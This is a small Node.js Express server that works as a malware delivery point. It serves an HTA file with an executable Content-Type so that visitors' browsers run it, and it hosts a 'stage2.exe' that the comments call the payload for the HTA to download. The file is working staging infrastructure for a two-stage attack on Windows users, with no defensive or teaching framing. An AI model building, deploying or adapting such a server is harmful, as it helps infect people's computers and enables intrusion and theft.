const express = require('express');
const path = require('path');
const app = express();

// Serve the HTA with the correct Content-Type for execution
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'application/hta');
    res.sendFile(path.join(__dirname, 'index.hta'));
});

// Serve the HTA explicitly if requested
app.get('/index.hta', (req, res) => {
    res.setHeader('Content-Type', 'application/hta');
    res.sendFile(path.join(__dirname, 'index.hta'));
});

// Serve the executable payload for the HTA to download
app.get('/stage2.exe', (req, res) => {
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', 'attachment; filename="stage2.exe"');
    res.sendFile(path.join(__dirname, 'stage2.exe'));
});

// Fallback for any other requests
app.use((req, res) => {
    res.status(404).send('Not Found');
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
